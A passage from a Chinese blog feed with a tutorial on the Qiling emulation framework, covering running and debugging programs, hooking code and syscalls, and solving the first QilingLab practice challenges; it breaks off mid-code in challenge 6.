&lt;h2 id=&quot;1-musl-1-1-24&quot;&gt;&lt;a href=&quot;#1-musl-1-1-24&quot; class=&quot;headerlink&quot; title=&quot;1.musl 1.1.24&quot;&gt;&lt;/a&gt;1.musl 1.1</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>qiling框架学习</title>
    <link href="http://example.com/2023/07/07/qiling%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/07/07/qiling%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-07-07T03:16:27.000Z</published>
    <updated>2023-07-07T03:16:35.583Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Qiling是一款功能强大的高级代码模拟框架</strong></p><p>很早就知道了qiling框架，一直想学但一直都忙于别的事情，这段时间打算开始学习qiling框架，记录一下学习的历程</p><h2 id="0x1-运行程序"><a href="#0x1-运行程序" class="headerlink" title="0x1.运行程序"></a>0x1.运行程序</h2><p>编写一个简单的hello world程序，交叉编译为mipsel架构的，使用qiling来运行，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line">sys.path.append(<span class="string">&quot;..&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql=Qiling([<span class="string">&quot;./hello&quot;</span>],<span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span>,verbose=QL_VERBOSE.DEFAULT)</span><br><span class="line">    ql.run()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><a href="https://imgtu.com/i/RgPj3T"><img src="https://z3.ax1x.com/2021/07/02/RgPj3T.png" alt="RgPj3T.png"></a></p><p>执行效果类似于strace</p><p>看到Qiling这个类</p><p><a href="https://imgtu.com/i/RgiNrQ"><img src="https://z3.ax1x.com/2021/07/02/RgiNrQ.png" alt="RgiNrQ.png"></a></p><p>参数非常多，我们目前先看到上面的脚本用到的三个参数，剩下的参数啥时候用到了啥时候再分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql=Qiling([<span class="string">&quot;./hello&quot;</span>],<span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span>,verbose=QL_VERBOSE.DEFAULT)</span><br></pre></td></tr></table></figure><p><code>[]</code>内部的是要执行的程序以及执行所需的参数，我们将程序修改为如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将脚本修改为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line">sys.path.append(<span class="string">&quot;..&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql=Qiling([<span class="string">&quot;./hello&quot;</span>,<span class="string">&quot;hello&quot;</span>],<span class="string">&quot;/usr/mipsel-linux-gnu&quot;</span>,verbose=QL_VERBOSE.DEFAULT)</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/RgFBeH"><img src="https://z3.ax1x.com/2021/07/02/RgFBeH.png" alt="RgFBeH.png"></a></p><p>和正常在终端运行程序一样，将程序名和参数都写入<code>[]</code>即可</p><p>第二个参数，<code>&quot;/usr/mipsel-linux-gnu&quot;</code>，库文件的路径</p><p>第三个参数，输出的详细程度，在我的脚本中使用的是<code>QL_VERBOSE.DEAFAULT</code>,还有其他的参数可供选择</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">QL_VERBOSE</span>(<span class="title class_ inherited__">IntEnum</span>):</span><br><span class="line">    OFF = <span class="number">0</span></span><br><span class="line">    DEFAULT = <span class="number">1</span></span><br><span class="line">    DEBUG = <span class="number">4</span></span><br><span class="line">    DISASM = <span class="number">10</span></span><br><span class="line">    DUMP = <span class="number">20</span></span><br></pre></td></tr></table></figure><p>每种的效果怎样我就不说了，师傅们可以自己尝试。</p><p>这就是第一个qiling脚本，学习如何使用qiling运行不同架构的程序。</p><h2 id="0x2-使用qiling进行调试"><a href="#0x2-使用qiling进行调试" class="headerlink" title="0x2 使用qiling进行调试"></a>0x2 使用qiling进行调试</h2><p>只需要在<code>ql.run()</code>之前添加一句<code>ql.debugger=True</code>即可，这样子默认就会监听9999端口，官方给的方法有这些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You can also customize address &amp; port or type of debugging server</span><br><span class="line">ql.debugger= &quot;:9999&quot;  # GDB server listens to 0.0.0.0:9999</span><br><span class="line">ql.debugger = &quot;127.0.0.1:9999&quot;  # GDB server listens to 127.0.0.1:9999</span><br><span class="line">ql.debugger = &quot;gdb:127.0.0.1:9999&quot;  # GDB server listens to 127.0.0.1:9999</span><br><span class="line">ql.debugger = &quot;idapro:127.0.0.1:9999&quot;  # IDA pro server listens to 127.0.0.1:9999</span><br></pre></td></tr></table></figure><p>效果如下</p><p><a href="https://imgtu.com/i/RgAQa9"><img src="https://z3.ax1x.com/2021/07/02/RgAQa9.png" alt="RgAQa9.png"></a></p><p>感觉还不错</p><h2 id="0x3-使用qiling-hook程序"><a href="#0x3-使用qiling-hook程序" class="headerlink" title="0x3.使用qiling hook程序"></a>0x3.使用qiling hook程序</h2><p>hook可以玩的很花，这里就按照官方文档的顺序来讲解,不过只学习几个常用的方法</p><h3 id="0x1-ql-hook-address"><a href="#0x1-ql-hook-address" class="headerlink" title="0x1.ql.hook_address()"></a>0x1.ql.hook_address()</h3><p>使用<code>ql.hook_address()</code>来hook一个特定的地址</p><p><a href="https://imgtu.com/i/RgcIbt"><img src="https://z3.ax1x.com/2021/07/03/RgcIbt.png" alt="RgcIbt.png"></a></p><p>目标是hook掉0x4004fd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook</span>(<span class="params">ql</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hook&quot;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql=Qiling([<span class="string">&quot;./hello&quot;</span>],<span class="string">&quot;/&quot;</span>,verbose=QL_VERBOSE.DISASM)</span><br><span class="line">    ql.hook_address(hook,<span class="number">0x4004fd</span>)</span><br><span class="line">    ql.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><a href="https://imgtu.com/i/RggNZt"><img src="https://z3.ax1x.com/2021/07/03/RggNZt.png" alt="RggNZt.png"></a></p><p>在0x4004fd处执行了我们的hook函数</p><h3 id="0x2-ql-hook-code"><a href="#0x2-ql-hook-code" class="headerlink" title="0x2. ql.hook_code()"></a>0x2. ql.hook_code()</h3><p><code>ql.hook_code()</code></p><blockquote><p>hooking every instruction with self defined function</p></blockquote><p>可以hook每一条指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">md = Cs(CS_ARCH_X86,CS_MODE_64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_asm</span>(<span class="params">ql, address, size</span>):</span><br><span class="line">    buf = ql.mem.read(address, size)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(buf, address):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;:: 0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook</span>(<span class="params">ql, address, size</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hook&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql=Qiling([<span class="string">&quot;./hello&quot;</span>],<span class="string">&quot;/&quot;</span>,verbose=QL_VERBOSE.DEFAULT)</span><br><span class="line">    ql.hook_code(hook)</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>官方文档中给的例子是打印每一条汇编指令，hook函数需要给三个参数，ql对象，指令的地址，指令的长度</p><p><a href="https://imgtu.com/i/RgoAzV"><img src="https://z3.ax1x.com/2021/07/03/RgoAzV.png" alt="RgoAzV.png"></a></p><p>这是第一个<code>printf_asm</code>函数</p><p><a href="https://imgtu.com/i/RgTVfI"><img src="https://z3.ax1x.com/2021/07/03/RgTVfI.png" alt="RgTVfI.png"></a>这是第二个我们自己写的</p><h2 id="0x4-qilinglab-x86"><a href="#0x4-qilinglab-x86" class="headerlink" title="0x4.qilinglab-x86"></a>0x4.qilinglab-x86</h2><p>这是一个学习qiling框架的小练习，一共11个挑战，方便我们快速入门qiling，以<a href="https://bbs.pediy.com/thread-268989.htm">11个小挑战，Qiling Framework 入门上手跟练</a>和<a href="https://joansivion.github.io/qilinglabs/">Qiling Labs</a>为教程跟随练习<br>前者的架构为x86_64架构，后者为aarch64，我这里使用x86_64的程序</p><p>一共有如下11个挑战</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Challenge 1: Store 1337 at pointer 0x1337</span><br><span class="line">Challenge 2: Make the &#x27;uname&#x27; syscall return the correct values.</span><br><span class="line">Challenge 3: Make &#x27;/dev/urandom&#x27; and &#x27;getrandom&#x27; &quot;collide&quot;.</span><br><span class="line">Challenge 4: Enter inside the &quot;forbidden&quot; loop.</span><br><span class="line">Challenge 5: Guess every call to rand().</span><br><span class="line">Challenge 6: Avoid the infinite loop.</span><br><span class="line">Challenge 7: Don&#x27;t waste time waiting for &#x27;sleep&#x27;.</span><br><span class="line">Challenge 8: Unpack the struct and write at the target address.</span><br><span class="line">Challenge 9: Fix some string operation to make the iMpOsSiBlE come true.</span><br><span class="line">Challenge 10: Fake the &#x27;cmdline&#x27; line file to return the right content.</span><br><span class="line">Challenge 11: Bypass CPUID/MIDR_EL1 checks.</span><br></pre></td></tr></table></figure><p>IDA反编译看看</p><h3 id="0x1-challenge1"><a href="#0x1-challenge1" class="headerlink" title="0x1.challenge1"></a>0x1.challenge1</h3><p><a href="https://imgtu.com/i/qSDJtH"><img src="https://s1.ax1x.com/2022/03/16/qSDJtH.png" alt="qSDJtH.png"></a><br>检查0x1337这个地址里面的值是不是1337，因此我们需要往0x1337处写入1337<br>映射一块内存</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.<span class="built_in">map</span>(<span class="number">0x1000</span>,<span class="number">0x1000</span>,info=<span class="string">&quot;challenge1&quot;</span>)</span><br></pre></td></tr></table></figure><p>地址从0x1000开始，长度为0x1000，起始地址和长度有如下要求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Address:</span><br><span class="line"></span><br><span class="line">You need to align the memory offset and address for mapping.</span><br><span class="line"></span><br><span class="line">addr//size*size -&gt; 0x7fefc9e0//4096*4096</span><br><span class="line"></span><br><span class="line">Size:</span><br><span class="line"></span><br><span class="line">The amounts of memory that should be mapped</span><br><span class="line"></span><br><span class="line">This parameter is OS dependant; If you use a linux system, consider at least a multiple of 4096 for alignment</span><br></pre></td></tr></table></figure><p>size需要4k对齐<br>challenge1的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">challenge1</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x1000</span>,<span class="number">0x1000</span>,info=<span class="string">&quot;challenge1&quot;</span>)</span><br><span class="line">    ql.mem.show_mapinfo()</span><br><span class="line">    ql.mem.write(<span class="number">0x1337</span>,ql.pack16(<span class="number">1337</span>))</span><br></pre></td></tr></table></figure><p>运行后，可以从进程的内存分布查看到映射的内存<br><a href="https://imgtu.com/i/qShZSU"><img src="https://s1.ax1x.com/2022/03/16/qShZSU.png" alt="qShZSU.png"></a></p><h3 id="0x2-challenge2"><a href="#0x2-challenge2" class="headerlink" title="0x2.challenge2"></a>0x2.challenge2</h3><p><a href="https://imgtu.com/i/qS4u38"><img src="https://s1.ax1x.com/2022/03/16/qS4u38.png" alt="qS4u38.png"></a></p><p>uname这个系统调用用来获得操作系统的一些信息的，其参数name的类型是struct utsname类型，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">utsname</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* Name of the implementation of the operating system.  */</span></span><br><span class="line">    <span class="type">char</span> sysname[_UTSNAME_SYSNAME_LENGTH];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Name of this node on the network.  */</span></span><br><span class="line">    <span class="type">char</span> nodename[_UTSNAME_NODENAME_LENGTH];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Current release level of this implementation.  */</span></span><br><span class="line">    <span class="type">char</span> release[_UTSNAME_RELEASE_LENGTH];</span><br><span class="line">    <span class="comment">/* Current version level of this release.  */</span></span><br><span class="line">    <span class="type">char</span> version[_UTSNAME_VERSION_LENGTH];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Name of the hardware type the system is running on.  */</span></span><br><span class="line">    <span class="type">char</span> machine[_UTSNAME_MACHINE_LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _UTSNAME_DOMAIN_LENGTH - 0</span></span><br><span class="line">    <span class="comment">/* Name of the domain of this node on the network.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> __USE_GNU</span></span><br><span class="line">    <span class="type">char</span> domainname[_UTSNAME_DOMAIN_LENGTH];</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">    <span class="type">char</span> __domainname[_UTSNAME_DOMAIN_LENGTH];</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> _UTSNAME_LENGTH 65</span></span><br></pre></td></tr></table></figure><p>  challenge2要使sysname为QilingOS，version为ChallengeStart，如何hook系统调用，在qiling中使用ql.set_syscall，原型如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_syscall</span>(<span class="params">self, target_syscall, intercept_function, intercept = <span class="literal">None</span></span>):</span><br></pre></td></tr></table></figure><p>target_syscall是目标系统调用，intercept_function是我们自定义的系统调用，intercept定义在什么时候拦截系统调用<br>首先编写我们自己的系统调用，uname的参数是name结构体的地址，传参为rdi，调用结束后将值写入指针所指的内存中。我们可以在调用结束后，也就是即将退出系统调用的时候拦截uname，修改rdi指向内存的数据，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_uname_on_exit</span>(<span class="params">ql:Qiling,*args,**kw</span>):</span><br><span class="line">    rdi=ql.reg.rdi</span><br><span class="line">    ql.mem.write(rdi,<span class="string">b&quot;QilingOS\x00&quot;</span>)</span><br><span class="line">    ql.mem.write(rdi+<span class="number">65</span>*<span class="number">3</span>,<span class="string">b&#x27;ChallengeStart\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这个是我们自定义的系统调用，首先获取rdi的值，即name结构体的指针，然后往指针指向的内存中写入数据，像内存中写入数据使用ql.mem.write<br>根据上面的utsname结构体的定义，sysname是第一个结构体成员，version是第四个每一个成员的长度为65字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">challenge2</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.set_syscall(<span class="string">&quot;uname&quot;</span>,hook_uname_on_exit,QL_INTERCEPT.EXIT)</span><br></pre></td></tr></table></figure><p>使用QL_INTERCEPT.EXIT需要引入头文件<code>from qiling.const import *</code></p><h3 id="0x3-challenge3"><a href="#0x3-challenge3" class="headerlink" title="0x3.challenge3"></a>0x3.challenge3</h3><p><a href="https://imgtu.com/i/qSbbwD"><img src="https://s1.ax1x.com/2022/03/16/qSbbwD.png" alt="qSbbwD.png"></a><br>从&#x2F;dev&#x2F;urandom中读出32个字节的随机数要与用getrandom函数获取的32个随机数全部相同，另外再从&#x2F;dev&#x2F;urandom中读出1字节，这1字节不能与上面的32个字节相同。<br>challenge3涉及到了另一个知识，劫持文件系统。在qiling中，涉及到伪造文件系统的类都需要继承自QlFsMappedObject这个类，此挑战我们可以这样伪造文件系统</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fake_urandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self,size</span>):</span><br><span class="line">        <span class="keyword">if</span> size==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;\x00&#x27;</span>*size</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>伪造的文件系统至少需要read和close两个方法，在这个fake_urandom类中，如果读取的长度是1，就返回一个数字1，如果长度不为1，则返回size个空字符。这两种情况对应着challenge3中从&#x2F;dev&#x2F;urandom中读取32个字节和1个字节的情况。<br>再看到getrandom，这也是个系统调用，原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">getrandom</span><span class="params">(<span class="type">void</span> * buf，<span class="type">size_t</span> buflen，<span class="type">unsigned</span> <span class="type">int</span>标志)</span>;</span><br></pre></td></tr></table></figure><p>往buf中写入buflen个随机数。</p><blockquote><p>成功后，getrandom()返回复制到缓冲区buf的字节数。如果在标志中指定了GRND_RANDOM，并且随机源中没有足够的熵，或者系统调用被信号中断，则该数目可能小于通过buflen请求的字节</p></blockquote><p>我们hook掉getrandom这个系统调用，只需在我们的hook函数中往buf中写入size*’\x00’即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getrandom_hook</span>(<span class="params">ql:Qiling,buf,size,flags,*args,**kw</span>):</span><br><span class="line">    ql.mem.write(buf,<span class="string">b&#x27;\x00&#x27;</span>*size)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.set_syscall(<span class="string">&quot;getrandom&quot;</span>,getrandom_hook)</span><br><span class="line">    ql.add_fs_mapper(<span class="string">&quot;/dev/urandom&quot;</span>,Fake_urandom())</span><br></pre></td></tr></table></figure><h3 id="0x4-challenge4"><a href="#0x4-challenge4" class="headerlink" title="0x4.challenge4"></a>0x4.challenge4</h3><p>IDA伪代码有问题，什么都没有，直接看汇编<br><a href="https://imgtu.com/i/qSx1AK"><img src="https://s1.ax1x.com/2022/03/16/qSx1AK.png" alt="qSx1AK.png"></a></p><p>将a和b的值都设置为0，然后比较a和b的值，如果a小于b就将challenge4要检查的值设为1，否则直接退出。<br>由于a等于b，所以实际上是不能进入到loc_E35的，我们要做的就是使jl这个指令成立。由于a&#x3D;0，所以我们只需要在程序运行到0xE43时将eax修改为1，就能满足jl，进入到loc_E35<br>这里需要用的是ql.hook_address</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_address</span>(<span class="params">self, callback, address, user_data=<span class="literal">None</span></span>):</span><br></pre></td></tr></table></figure><p>callback为执行到address时执行的函数<br>于是我们这样写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_base</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    <span class="keyword">for</span> info <span class="keyword">in</span> ql.mem.map_info:</span><br><span class="line">        <span class="keyword">if</span> info[<span class="number">2</span>]==<span class="number">5</span> <span class="keyword">and</span> <span class="string">&#x27;qilinglab-x86_64&#x27;</span> <span class="keyword">in</span> info[<span class="number">3</span>]:</span><br><span class="line">            <span class="keyword">return</span> info[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter_forbidden_loop</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.reg.eax=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge4</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    base=get_base(ql)</span><br><span class="line">    addr=base+<span class="number">0xe43</span></span><br><span class="line">    ql.hook_address(enter_forbidden_loop,addr)</span><br></pre></td></tr></table></figure><p>关于这个get_base函数，我用它来获取程序运行基地址，实际上，在qiling中有ql.mem.get_lib_base(ql.path)用来获取基地址的，不过我用起来似乎出了点问题，返回值为-1，就利用ql.mem.map_info写了一个<br>ql.mem.map_info实际上就是下面这个<br><a href="https://imgtu.com/i/qpCUT1"><img src="https://s1.ax1x.com/2022/03/16/qpCUT1.png" alt="qpCUT1.png"></a>进程的内存分布，每一行都是一个数组，长度为5，数组下标从0到4分别对应着Start，End，Perm，Label，Image的值。</p><h3 id="0x5-challenge5"><a href="#0x5-challenge5" class="headerlink" title="0x5.challenge5"></a>0x5.challenge5</h3><p><a href="https://imgtu.com/i/q9eTs0"><img src="https://s1.ax1x.com/2022/03/17/q9eTs0.png" alt="q9eTs0.png"></a><br>在一个循环中将v5这个数组的前面一截赋值为0，后面一截赋值为随机数，然后检查这两段的值是否一样。<br>很明显，我们需要hook掉rand函数，使其返回0<br><a href="https://imgtu.com/i/q9ulGQ"><img src="https://s1.ax1x.com/2022/03/17/q9ulGQ.png" alt="q9ulGQ.png"></a><br>rand函数的返回值是放在eax的，因此我们在hook函数中将eax设为0，由于rand函数不是系统调用，我们这里用到ql.set_api</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_rand</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.reg.rax=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge5</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.set_api(<span class="string">&quot;rand&quot;</span>,hook_rand)</span><br></pre></td></tr></table></figure><p>比较简单的一个challenge</p><h3 id="0x6-challenge6"><a href="#0x6-challenge6" class="headerlink" title="0x6.challenge6"></a>0x6.challenge6</h3><p>IDA伪代码寄，还得看汇编<br><a href="https://imgtu.com/i/q9Kf00"><img src="https://s1.ax1x.com/2022/03/17/q9Kf00.png" alt="q9Kf00.png"></a></p><p>将0和1分别作为初值赋给i和j，然后将判断j是否为0，如果为0即通过挑战<br>显然，正常走流程是直接结束了。这个挑战和挑战4是类似的，依葫芦画瓢即可，在jnz那条指令处进行hook，将rax设置为0即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">infinite_loop_bypass_hook</span>(<span class="params">ql:Qiling</span>):</span><br><span class="line">    ql.reg.rax=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge6</span>(<span 